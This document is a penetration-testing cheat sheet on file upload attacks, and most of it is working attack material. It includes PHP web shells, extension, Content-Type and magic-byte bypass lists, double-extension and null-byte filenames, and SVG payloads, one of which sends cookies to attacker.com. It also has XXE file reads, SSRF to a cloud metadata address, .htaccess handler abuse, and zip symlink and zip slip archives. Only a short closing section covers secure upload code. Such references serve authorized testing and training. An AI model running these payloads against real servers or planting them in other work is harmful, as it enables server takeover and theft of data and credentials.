# File Upload Attacks

## File Upload Vulnerabilities

### Overview

**File upload vulnerabilities** occur when web applications fail to properly validate files uploaded by users. Attackers can exploit these weaknesses to upload malicious files, potentially leading to complete server compromise.

**Why it's critical:**

* Direct path to remote code execution (RCE)
* Can bypass other security controls
* Often overlooked in security testing
* Multiple bypass techniques available
* Can lead to full system takeover

**Common vulnerable components:**

* Profile picture upload
* Document sharing systems
* Resume/CV upload forms
* Backup/restore functionality
* File management systems
* Content management systems (CMS)

**Impact:**

* Remote code execution
* Complete server compromise
* Data exfiltration
* Malware distribution
* Defacement
* Denial of service

***

### Exploitation Workflow Summary

```
1. Discovery & Mapping
   ├─ Locate upload functionality
   ├─ Identify file type restrictions
   ├─ Map upload directory
   └─ Test direct file access

2. Validation Analysis
   ├─ Client-side validation
   ├─ Server-side validation
   ├─ File type checking method
   └─ Size/content restrictions

3. Bypass Techniques
   ├─ Extension manipulation
   ├─ Content-Type spoofing
   ├─ Magic byte injection
   └─ Double extension tricks

4. Exploitation
   ├─ Web shell upload
   ├─ Malicious file execution
   ├─ Path traversal attacks
   └─ XXE/SSRF via file formats

5. Post-Exploitation
   ├─ Command execution
   ├─ Privilege escalation
   ├─ Lateral movement
   └─ Persistence establishment
```

***

### Validation Types & Bypasses

#### 1. No Validation (Absent Validation)

**Vulnerable scenario:** Application accepts any file without checks.

**Test payload:**

```php
<?php echo "Test successful"; ?>
```

**Save as:** `test.php`

**Web shell example:**

```php
<?php system($_GET['cmd']); ?>
```

**Access:**

```
http://target.com/uploads/test.php?cmd=whoami
```

***

#### 2. Client-Side Validation

**How it works:** JavaScript validates file before upload.

**Example vulnerable code:**

```html
<input type="file" name="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

```javascript
function checkFile(file) {
    var extension = file.value.split('.').pop().toLowerCase();
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        alert("Only images allowed!");
        file.form.reset();
    }
}
```

**Bypass Method 1: Intercept with Burp**

1. Upload legitimate image
2. Intercept request in Burp
3. Change filename to `shell.php`
4. Change file content to PHP code
5. Forward request

**Bypass Method 2: Disable JavaScript**

1. Open browser DevTools (F12)
2. Find validation function
3. Delete `onchange="checkFile(this)"` attribute
4. Upload malicious file directly

**Bypass Method 3: Remove accept attribute**

```html
<!-- Before -->
<input type="file" accept=".jpg,.jpeg,.png">

<!-- After (in DevTools) -->
<input type="file">
```

***

#### 3. Blacklist Filters

**Vulnerable code example:**

```php
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    die("File type not allowed");
}
```

**PHP Extension Alternatives:**

```
.php
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtml
.phar
.pgif
.inc
.hphp
```

**ASP.NET Extensions:**

```
.asp
.aspx
.config
.ashx
.asmx
.aspq
.axd
.cshtml
.vbhtml
.rem
.soap
.cer
.asa
```

**JSP Extensions:**

```
.jsp
.jspx
.jsw
.jsv
.jspf
.action
.do
```

**Testing methodology:**

**Step 1: Identify blacklisted extensions**

```bash
# Upload test.php -> Blocked
# Upload test.php5 -> Success?
```

**Step 2: Fuzz extensions with Burp Intruder**

**Position:**

```
filename="shell.§php§"
```

**Payloads:** Use wordlist: `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt`

**Step 3: Analyze responses**

* Look for different Content-Length
* Check for success messages
* Test execution of uploaded files

***

#### 4. Whitelist Bypass (Double Extensions)

**Vulnerable regex:**

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)/', $fileName)) {
    die("Only images allowed");
}
```

**Problem:** Only checks if extension exists, not if it's the final one.

**Bypass payloads:**

```
shell.php.jpg
shell.png.php
shell.jpeg.php5
image.jpg.phar
exploit.png.phtml
```

**Apache misconfiguration exploitation:**

**File:** `/etc/apache2/mods-enabled/php7.4.conf`

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Exploit:**

* Upload `shell.php.jpg`
* Passes whitelist (ends with `.jpg`)
* Executes as PHP (contains `.php`)

**Complete double extension list:**

```
file.php.png
file.png.php
file.PhP.jpg
file.php%0A.png
file.php%0D.png
file.php.
file.php.\
file.php./
file.php%20.png
file.php?.png
file.php#.png
file.jpg.php
```

***

#### 5. Character Injection

**Special characters to inject:**

```
%20  (space)
%0a  (newline)
%00  (null byte)
%0d0a (CRLF)
/    (forward slash)
.\   (backslash + dot)
.    (dot)
…    (multiple dots)
:    (colon)
```

**Null byte injection (PHP < 5.3):**

```
shell.php%00.jpg
```

**How it works:**

* Server sees: `shell.php\0.jpg`
* Whitelist check: passes (ends with `.jpg`)
* File saved as: `shell.php` (null byte terminates string)

**Windows-specific (colon injection):**

```
shell.aspx:.jpg
```

**Automated wordlist generation:**

```bash
#!/bin/bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**Fuzz with Burp:**

1. Upload image
2. Intercept request
3. Send to Intruder
4. Set position on filename
5. Load generated wordlist
6. Start attack
7. Look for different response sizes

***

#### 6. Content-Type Bypass

**Vulnerable validation:**

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png'))) {
    die("Only images allowed");
}
```

**Bypass:**

**Original request:**

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Modified request:**

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**Common image Content-Types:**

```
image/jpeg
image/jpg
image/png
image/gif
image/svg+xml
image/webp
```

***

#### 7. Magic Bytes (MIME Type)

**What are magic bytes?** First few bytes of a file that identify its format.

**Common magic bytes:**

```
JPEG: FF D8 FF E0
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38
PDF:  25 50 44 46
```

**Vulnerable check:**

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpeg', 'image/png'))) {
    die("Only images allowed");
}
```

**Bypass method:**

**Step 1: Add magic bytes to PHP file**

```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Add GIF magic bytes
echo 'GIF8' | cat - shell.php > shell.php.gif
```

**Step 2: Verify**

```bash
file shell.php.gif
# Output: GIF image data

head -c 20 shell.php.gif
# Output: GIF8<?php system($_GET...
```

**Using hex editor:**

```bash
hexeditor shell.php
```

**Change first 4 bytes from:**

```
41 41 41 41  (AAAA)
```

**To:**

```
FF D8 FF DB  (JPEG magic bytes)
```

**Result:**

* File identified as JPEG
* PHP code still executes

***

### Advanced Bypass Techniques

#### Case Manipulation

**Bypass case-sensitive filters:**

```
shell.PhP
shell.pHp
shell.PHP
shell.Php5
shell.pHtml
```

**Why it works:**

* Filter checks lowercase only
* Windows treats extensions case-insensitively
* `shell.PhP` executes as PHP on Windows

#### Obfuscated Extensions

**Add unexpected characters:**

```
shell.p.phphp
shell.pphphp
```

**How it works:**

* Some parsers remove middle `.php`
* Results in `shell.php`

#### Capitalization + Special Characters

**Combined techniques:**

```
shell.pHP%00.jpg
shell.PhP%20.png
shell.PHP%0a.gif
```

***

### Limited Upload Exploitation

#### XSS via Filename

**Filename XSS payload:**

```
"><img src=x onerror=alert(1)>.jpg
"><img src=x onerror=alert(document.domain)>.png
"><img src="/" =_=" title="onerror='prompt(document.cookie)'">.png
```

**Why it works:**

* Filename displayed without sanitization
* Browser executes JavaScript in filename

#### SVG File XSS

**Simple alert:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**Domain display:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

**Cookie theft:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">
        fetch('https://attacker.com/steal?c=' + document.cookie);
    </script>
</svg>
```

#### XXE via SVG

**Read /etc/passwd:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**Read PHP source (base64):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**SSRF:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg>&xxe;</svg>
```

***

### Path Traversal in Upload

**Filename manipulation:**

```
../../../shell.php
..%2f..%2f..%2fshell.php
%2e%2e%2fshell.php
```

**Example:**

**Upload request:**

```http
POST /upload HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Result:** File uploaded to web root instead of intended directory.

***

### Metadata Exploitation

#### Exiftool Comment Injection

**Add PHP code to image metadata:**

```bash
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

**Alternative:**

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" image.jpg -o exploit.php
```

***

### .htaccess Upload

**Create .htaccess:**

```apache
AddType application/x-httpd-php .png
```

**Upload to directory**

**Then upload PNG with PHP code:**

```
image.png (contains PHP code)
```

**Result:**

* `.htaccess` makes `.png` files execute as PHP
* `image.png` executes PHP code

***

### ZIP File Exploitation

#### Symlink Attack

**Create symlink:**

```bash
ln -s /etc/passwd passwd.txt
zip --symlinks exploit.zip passwd.txt
```

**Upload and extract**

**Access:**

```
http://target.com/uploads/passwd.txt
```

#### Zip Slip Vulnerability

**Create malicious ZIP:**

```bash
# File contains path traversal
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
zip exploit.zip ../../../../var/www/html/shell.php
```

**Result:** File extracted to web root instead of intended directory.

***

### PDF Exploitation

#### PDF XSS

**Malicious PDF with JavaScript:**

```pdf
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Contents 4 0 R
   /Annots [5 0 R] >>
endobj
4 0 obj
<< /Length 0 >>
stream
endstream
endobj
5 0 obj

  /Type /Annot
  /Subtype /Link
  /A << /S /URI /URI (javascript:alert(document.cookie)) >>
>>
endobj
```

#### PDF SSRF

**Test for SSRF:**

1. Upload PDF with external link
2. Check if server makes request
3. Exploit to access internal services

**Example payload (requires proper PDF structure):**

```
Include link to: http://169.254.169.254/latest/meta-data/
```

***

### Office Document XXE

#### DOCX/XLSX XXE

**Extract and modify:**

```bash
# Unzip DOCX
unzip document.docx -d extracted/

# Edit word/document.xml
vim extracted/word/document.xml
```

**Add XXE payload:**

```xml
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**Repackage:**

```bash
cd extracted/
zip -r ../malicious.docx *
```

***

### Defense & Mitigation

**Secure upload implementation:**

```php
// 1. Whitelist extensions
$allowed = ['jpg', 'jpeg', 'png'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die("Invalid type");

// 2. Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($mime, ['image/jpeg', 'image/png'])) die("Invalid MIME");

// 3. Generate random filename
$filename = bin2hex(random_bytes(16)) . '.' . $ext;

// 4. Store outside web root
$upload_dir = '/var/uploads/';  // Not /var/www/html/uploads/
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $filename);

// 5. Serve via script (not direct access)
// download.php?file=abc123def456.jpg
```

**Additional protections:**

* Store uploads outside web root
* Serve files via download script
* Strip EXIF data
* Implement size limits
* Use antivirus scanning
* Disable script execution in upload directory
* Implement rate limiting

***

### Quick Reference

#### Extension Fuzzing

```bash
# Burp Intruder position
filename="shell.§ext§"

# Payloads
.php, .php3, .php4, .php5, .phtml, .phar
.asp, .aspx, .config, .ashx
.jsp, .jspx
```

#### Content-Type Bypass

```
Change: Content-Type: application/x-php
To: Content-Type: image/jpeg
```

#### Magic Bytes

```bash
# Add GIF header
echo 'GIF8' | cat - shell.php > shell.gif

# Add JPEG header (hex)
printf '\xFF\xD8\xFF\xE0' | cat - shell.php > shell.jpg
```

#### Double Extension

```
shell.php.jpg
shell.jpg.php
image.png.phar
```



